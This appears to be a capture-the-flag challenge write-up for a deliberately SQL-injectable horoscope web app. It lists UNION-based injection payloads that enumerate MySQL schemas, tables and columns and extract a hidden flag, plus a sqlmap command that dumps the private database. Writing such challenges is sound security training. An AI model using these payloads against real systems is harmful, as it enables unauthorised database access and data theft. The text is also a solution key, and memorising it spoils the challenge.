# Horoscope Generator

Users enter their birth month, day, and year. Month is SQL injectable, but the first x characters need to be an actual month for the app to accept it, and the day and year need to be numeric as well.

After injecting, there's a troll table in the current database named "flags", which just has a list of countries and descriptions of their national flags. The attacker will have to find the second database, find the flag table, then select the flag. To make this trickier, the app only outputs one row of the result, so additional SQL to select a certain row is necessary. Can be done with SQLmap, but requires a lot of tinkering to get it to work.

Injections:

1. List tables 1 by 1
  * `" union select concat(concat(table_schema, '.'), table_name) from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit 1 offset 3;#`
2. List columns in private.flag
  * `" union select column_name from information_schema.columns where table_schema = 'private' and table_name = 'flag' limit 1 offset 2;#`
3. Pull the flag
  * `" union select flag from private.flag limit 1 offset 1;#`
  
SQLmap:
`sqlmap --data='month=May&day=1&year=1999' --level=5 -u http://(challenge site)/index.php --threads=4 -D private --dump`
